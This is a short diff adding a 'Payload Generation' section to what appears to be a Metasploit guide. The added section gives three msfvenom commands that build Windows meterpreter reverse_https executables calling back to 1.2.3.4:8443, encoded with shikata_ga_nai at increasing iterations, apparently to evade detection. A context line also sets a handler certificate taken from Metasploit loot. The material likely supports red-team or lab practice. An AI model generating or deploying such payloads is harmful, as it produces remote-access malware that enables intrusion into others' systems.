@@ -26,4 +26,18 @@ To your new cert you collected:
 set HANDLERSSLCERT /root/.msf4/loot/20210526091350_default_93.184.216.34_93.184.216.34_pe_809138.pem
 ```
 
+## Payload Generation
 
+Create 3 msfvenom payloads
+
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test.exe
+```
+
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 20 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test2.exe
+```
+
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
+```
